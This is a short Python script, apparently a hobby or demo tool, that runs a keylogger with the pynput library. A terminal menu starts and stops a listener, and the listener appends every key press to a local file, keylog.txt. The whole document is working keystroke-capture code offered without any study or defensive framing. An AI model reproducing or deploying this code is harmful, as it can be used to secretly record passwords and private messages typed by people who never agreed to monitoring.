from pynput import keyboard
import threading

log_file = "keylog.txt"
listener = None  # Global variable to control the listener

# Function to handle key presses
def on_press(key):
    with open(log_file, "a") as f:
        f.write(str(key) + "\n")

# Function to start the listener
def start_keylogger():
    global listener
    if listener is None or not listener.running:
        listener = keyboard.Listener(on_press=on_press)
        listener.start()
        print("[✔] Keylogger started.")
    else:
        print("[!] Keylogger is already running.")

# Function to stop the listener
def stop_keylogger():
    global listener
    if listener and listener.running:
        listener.stop()
        listener = None
        print("[✘] Keylogger stopped.")
    else:
        print("[!] Keylogger is not running.")

# Main menu loop
def main():
    print("Simple Keylogger Terminal Control")
    print("Type 'start' to begin logging keys.")
    print("Type 'stop' to stop logging.")
    print("Type 'exit' to quit the program.")

    while True:
        command = input("\n>>> ").strip().lower()
        if command == "start":
            start_keylogger()
        elif command == "stop":
            stop_keylogger()
        elif command == "exit":
            stop_keylogger()
            print("Exiting program.")
            break
        else:
            print("Invalid command. Try: start | stop | exit")

if __name__ == "__main__":
    main()
